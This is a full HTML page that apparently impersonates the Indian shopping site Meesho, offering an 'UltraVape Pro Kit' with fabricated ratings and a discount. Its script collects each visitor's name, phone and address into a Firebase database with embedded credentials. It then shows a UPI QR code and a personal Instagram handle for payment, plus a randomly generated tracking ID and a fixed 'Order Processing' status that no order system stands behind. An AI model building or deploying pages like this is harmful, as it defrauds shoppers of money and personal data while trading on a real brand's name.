<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Meesho - UltraVape Pro Kit Offer</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style>
  * {
    box-sizing: border-box; margin: 0; padding: 0;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
  }
  body { background: #f5f3ff; padding: 10px; min-height: 100vh; display: flex; justify-content: center; }
  .page {
    max-width: 960px; width: 100%; background: #fff;
    border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.06);
    overflow: hidden;
    display: flex; flex-direction: column;
    min-height: 100vh;
  }
  .header {
    background: #e71c64; color: #fff; padding: 14px 16px;
    display: flex; justify-content: space-between; align-items: center;
  }
  .header-logo { font-weight: 700; font-size: clamp(18px, 2vw, 22px); }
  .header-badge {
    background: #ffe46b; color: #3c2a00; padding: 4px 10px;
    border-radius: 14px; font-size: clamp(10px, 1.5vw, 12px); font-weight: 600;
  }
  .panel { display: none; padding: 16px; flex: 1 1 auto; overflow-y: auto; }
  .panel.active { display: block; }

  .product-layout {
    display: flex; flex-wrap: wrap; gap: 16px;
    justify-content: center;
  }
  .product-image-box {
    flex: 1 1 280px; max-width: 320px;
    display: flex; justify-content: center; align-items: center; padding: 12px;
  }
  .product-image {
    max-width: 100%; border-radius: 10px; height: auto;
  }
  .product-details {
    flex: 2 1 320px; min-width: 260px; padding: 12px 12px 0 12px;
    display: flex; flex-direction: column;
  }
  .product-title {
    font-size: clamp(18px, 3vw, 24px);
    font-weight: 700; margin-bottom: 6px; color: #222;
  }
  .product-subtitle {
    font-size: clamp(12px, 2vw, 14px);
    color: #666; margin-bottom: 10px;
  }
  .rating-row {
    display: inline-flex; align-items: center; gap: 8px;
    font-size: clamp(11px, 1.5vw, 13px); margin-bottom: 12px;
  }
  .rating-pill {
    background: #23b26d; color: #fff; padding: 2px 8px;
    border-radius: 12px; display: inline-flex; align-items: center; gap: 4px;
    font-weight: 600;
  }
  .price-row {
    display: flex; align-items: baseline; gap: 10px; margin-bottom: 10px;
    font-size: clamp(14px, 3vw, 22px);
  }
  .price-main {
    font-weight: 700; color: #222;
  }
  .price-mrp {
    font-size: clamp(12px, 2vw, 14px);
    color: #999; text-decoration: line-through;
    font-weight: 400;
  }
  .price-off {
    font-size: clamp(12px, 2vw, 14px);
    color: #2e7d32; font-weight: 600;
  }
  .tag-line {
    font-size: clamp(11px, 1.5vw, 13px); color: #2e7d32; margin-bottom: 12px;
  }
  .badge-strip {
    display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 16px;
  }
  .badge {
    font-size: clamp(10px, 1.3vw, 12px); padding: 5px 12px;
    border-radius: 999px; border: 1px solid #f1e0f5;
    background: #fdf7ff; color: #5b2b5b;
  }
  .feature-list {
    font-size: clamp(11px, 1.3vw, 13px);
    color: #555; list-style: disc; padding-left: 20px; margin-bottom: 10px;
  }
  .section-title {
    font-size: clamp(14px, 2vw, 16px); font-weight: 700; margin-bottom: 12px;
    color: #222;
  }
  .btn-row {
    display: flex; flex-wrap: wrap; gap: 12px; margin-top: auto;
    margin-bottom: 8px;
  }
  button {
    border: none; cursor: pointer; font-size: clamp(13px, 2vw, 16px);
    padding: 12px 20px; border-radius: 8px; flex: 1 1 160px;
  }
  .btn-primary {
    background: #e71c64; color: #fff; font-weight: 600;
  }
  .btn-secondary {
    background: #ffe5f0; color: #e71c64; border: 1px solid #f5a7c8;
    font-weight: 500;
  }
  .btn-primary[disabled] {
    background: #ccc; cursor: not-allowed;
  }
  label {
    display: block; font-weight: 600; margin-bottom: 6px;
    font-size: clamp(12px, 1.5vw, 14px);
    color: #333;
  }
  input, textarea, select {
    width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid #ddd;
    font-size: clamp(12px, 1.5vw, 14px);
    margin-bottom: 16px;
  }
  textarea { resize: vertical; min-height: 90px; }

  .qr-box {
    text-align: center; margin-top: 8px;
  }
  .qr-img {
    width: 220px; max-width: 90%; border-radius: 14px; margin-bottom: 12px;
  }
  .contact-instagram {
    font-size: clamp(12px, 1.5vw, 14px);
    font-weight: 700; color: #e71c64; margin-top: 8px;
  }
  /* Centered notification container */
  #notification-container {
    position: fixed; top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    max-width: 320px; width: 90vw;
    z-index: 9999; pointer-events: none;
  }
  .notification {
    background: #e71c64; color: white;
    padding: 16px 24px; margin-bottom: 12px;
    border-radius: 10px;
    box-shadow: 0 2px 15px rgba(0, 0, 0, 0.15);
    font-weight: 700;
    pointer-events: auto;
    opacity: 0;
    animation: fadein 0.35s forwards, fadeout 0.35s 2.8s forwards;
    text-align: center;
  }
  @keyframes fadein {
    from {opacity: 0; transform: translateY(24px);}
    to {opacity: 1; transform: translateY(0);}
  }
  @keyframes fadeout {
    from {opacity: 1; transform: translateY(0);}
    to {opacity: 0; transform: translateY(-24px);}
  }

  @media (max-width: 600px) {
    .header {
      flex-direction: column; align-items: flex-start; gap: 8px;
    }
    .product-layout {
      flex-direction: column;
    }
    .btn-row {
      flex-direction: column;
    }
    .page {
      border-radius: 0;
      min-height: 100vh;
    }
    body {
      padding: 0; background: #fff;
    }
  }
</style>
</head>
<body>
<div class="page">
  <header class="header">
    <div class="header-logo">Meesho</div>
    <div class="header-badge">UltraVape Pro Kit - Limited Offer</div>
  </header>

  <section id="panel-product" class="panel active" role="region" aria-label="Product details">
    <div class="product-layout">
      <div class="product-image-box">
        <img
          src="https://i.postimg.cc/7L6WvYK4/6503cb2be913b356c01c7659-voopoo-black-drag-vape-mod-kit-uforce.jpg"
          alt="UltraVape Pro Kit"
          class="product-image"
        />
      </div>
      <div class="product-details">
        <div class="product-title">UltraVape Pro Kit</div>
        <div class="product-subtitle">Compact · Long Battery · Multiple Flavors</div>
        <div class="rating-row" aria-label="Product rating 4.5 stars">
          <div class="rating-pill" aria-hidden="true">
            <span>4.5</span>
            <span class="rating-star">★</span>
          </div>
          <span class="rating-count">12,345 Ratings · 1,234 Reviews</span>
        </div>
        <div class="price-row">
          <span class="price-main">₹3,499</span>
          <span class="price-mrp" aria-label="Original Price">₹4,999</span>
          <span class="price-off" aria-label="Discount 30% off">30% OFF</span>
        </div>
        <div class="tag-line">Free delivery · Online payment only · 6-Month Warranty</div>
        <div class="badge-strip" aria-label="Product badges">
          <span class="badge">Best Seller</span>
          <span class="badge">100% Original Product</span>
          <span class="badge">7-Day Easy Return</span>
        </div>
        <div class="section-block">
          <div class="section-title">Product Highlights</div>
          <ul class="feature-list">
            <li>High-performance vape kit designed for smooth vaping.</li>
            <li>Long-lasting battery suitable for all-day use.</li>
            <li>Compatible with multiple premium flavor pods.</li>
          </ul>
        </div>
        <div class="section-block">
          <div class="section-title">Product Details</div>
          <ul class="feature-list">
            <li>Type: Vape Mod Kit</li>
            <li>Battery: 2500 mAh rechargeable</li>
            <li>Charging: Type‑C fast charging supported</li>
            <li>Body: Metal finish with ergonomic grip</li>
          </ul>
        </div>
        <div class="btn-row">
          <button id="btnBookNow" class="btn-primary" aria-label="Book this product">Book Now</button>
          <button class="btn-secondary" onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="View product details">View Details</button>
        </div>
      </div>
    </div>
  </section>

  <section id="panel-address" class="panel" role="region" aria-label="Enter delivery details">
    <div class="section-title">Enter delivery details</div>
    <div class="section-subtitle">Please provide accurate details. You will receive order updates on Instagram.</div>
    <form id="addressForm">
      <label for="custName">Full Name</label>
      <input id="custName" name="custName" type="text" required />
      <label for="custPhone">Mobile Number</label>
      <input id="custPhone" name="custPhone" type="tel" required />
      <label for="custAddress">Full Address</label>
      <textarea id="custAddress" name="custAddress" required></textarea>
      <label for="custState">State</label>
      <input id="custState" name="custState" type="text" placeholder="Example: Maharashtra" />
      <label for="custQty">Quantity</label>
      <select id="custQty" name="custQty">
        <option value="1" selected>1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
      <div class="btn-row">
        <button type="button" id="btnAddressBack" class="btn-secondary">Back</button>
        <button type="submit" class="btn-primary">Submit Booking</button>
      </div>
    </form>
  </section>

  <section id="panel-payment" class="panel" role="region" aria-label="Payment section">
    <div class="section-title">Payment</div>
    <div class="section-subtitle">Scan the QR code below using your UPI app to complete payment.</div>
    <div class="qr-box">
      <img 
        src="https://i.postimg.cc/1XfhwHD3/upi-qr-sample.png" 
        alt="UPI QR code for payment" 
        class="qr-img" 
      />
      <div class="contact-instagram" aria-label="Instagram contact">
        Contact us on Instagram: <a href="https://www.instagram.com/attitude_huduga_46/" target="_blank" rel="noopener">@attitude_huduga_46</a>
      </div>
    </div>
    <div class="btn-row" style="margin-top: 14px;">
      <button type="button" id="btnPaymentBack" class="btn-secondary">Back to Address</button>
    </div>
  </section>

  <section id="panel-tracking" class="panel" role="region" aria-label="Order tracking">
    <h2>Your Order is Confirmed!</h2>
    <p>Tracking ID: <b id="trackingIdDisplay"></b></p>
    <p>Status: <b>Order Processing</b></p>
    <p>Thank you for booking with Meesho. You will receive shipment updates soon.</p>
  </section>

</div>

<div id="notification-container" aria-live="assertive" aria-atomic="true"></div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
  import { getDatabase, ref, set, push, onDisconnect } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";

  // Show notifications centered
  function showNotification(message) {
    const container = document.getElementById('notification-container');
    const notif = document.createElement('div');
    notif.className = 'notification';
    notif.textContent = message;
    container.appendChild(notif);
    setTimeout(() => notif.remove(), 3000);
  }

  const firebaseConfig = {
    apiKey: "AIzaSyAJiYRkrFv3th8muAxWDZ_Fzve3s-_AcI0",
    authDomain: "catt-a1b22.firebaseapp.com",
    databaseURL: "https://catt-a1b22-default-rtdb.firebaseio.com",
    projectId: "catt-a1b22",
    storageBucket: "catt-a1b22.firebasestorage.app",
    messagingSenderId: "450976381194",
    appId: "1:450976381194:web:144da5bbc9f5ea6af0a2f3",
    measurementId: "G-93XR3YKSRQ"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const panels = {
    product: document.getElementById("panel-product"),
    address: document.getElementById("panel-address"),
    payment: document.getElementById("panel-payment"),
    tracking: document.getElementById("panel-tracking")
  };

  const btnBookNow = document.getElementById("btnBookNow");
  const btnAddressBack = document.getElementById("btnAddressBack");
  const btnPaymentBack = document.getElementById("btnPaymentBack");
  const addressForm = document.getElementById("addressForm");
  const trackingIdDisplay = document.getElementById("trackingIdDisplay");

  function showPanel(name) {
    Object.values(panels).forEach(p => p.classList.remove("active"));
    panels[name].classList.add("active");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  function disableBookingIfOrdered() {
    const trackingId = localStorage.getItem("meeshoVapeTrackingId");
    if (trackingId) {
      trackingIdDisplay.textContent = trackingId;
      showPanel("tracking");
      btnBookNow.disabled = true;
      return true;
    }
    return false;
  }

  const sessionId = "sess_" + Math.random().toString(36).substr(2, 9);
  const userRef = ref(db, "liveUsers/" + sessionId);
  function updateUserPresence() {
    set(userRef, { lastActive: Date.now() });
    onDisconnect(userRef).remove();
  }
  updateUserPresence();
  setInterval(updateUserPresence, 30000);

  if (!disableBookingIfOrdered()) {
    showPanel("product");
  }

  btnBookNow.addEventListener("click", () => {
    if (btnBookNow.disabled) return;
    showPanel("address");
  });

  btnAddressBack.addEventListener("click", () => showPanel("product"));
  btnPaymentBack.addEventListener("click", () => showPanel("address"));

  addressForm.addEventListener("submit", async e => {
    e.preventDefault();
    if (btnBookNow.disabled) return;

    const name = document.getElementById("custName").value.trim();
    const phone = document.getElementById("custPhone").value.trim();
    const address = document.getElementById("custAddress").value.trim();
    const state = document.getElementById("custState").value.trim();
    const qty = document.getElementById("custQty").value;

    if (!name || !phone || !address) {
      showNotification("Please fill all required fields.");
      return;
    }

    try {
      const bookingsRef = ref(db, "bookings");
      await push(bookingsRef, {
        name, phone, address, state, quantity: qty, timestamp: Date.now()
      });

      const trackingId = "MEESHO" + Math.floor(Math.random() * 900000 + 100000);
      localStorage.setItem("meeshoVapeTrackingId", trackingId);
      trackingIdDisplay.textContent = trackingId;
      showPanel("payment");
      btnBookNow.disabled = true;
      showNotification("Booking successful! Tracking ID: " + trackingId);
    } catch (error) {
      showNotification("Booking error, please try again.");
      console.error(error);
    }
  });
</script>

<div id="notification-container" aria-live="assertive" aria-atomic="true"></div>
<style>
  #notification-container {
    position: fixed; top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    max-width: 320px; width: 90vw;
    z-index: 9999; pointer-events: none;
  }
  .notification {
    background: #e71c64; color: white;
    padding: 16px 24px; margin-bottom: 12px;
    border-radius: 10px;
    box-shadow: 0 2px 15px rgba(0, 0, 0, 0.15);
    font-weight: 700;
    pointer-events: auto;
    opacity: 0;
    animation: fadein 0.35s forwards, fadeout 0.35s 2.8s forwards;
    text-align: center;
  }
  @keyframes fadein {
    from {opacity: 0; transform: translateY(24px);}
    to {opacity: 1; transform: translateY(0);}
  }
  @keyframes fadeout {
    from {opacity: 1; transform: translateY(0);}
    to {opacity: 0; transform: translateY(-24px);}
  }
</style>
</body>
</html>
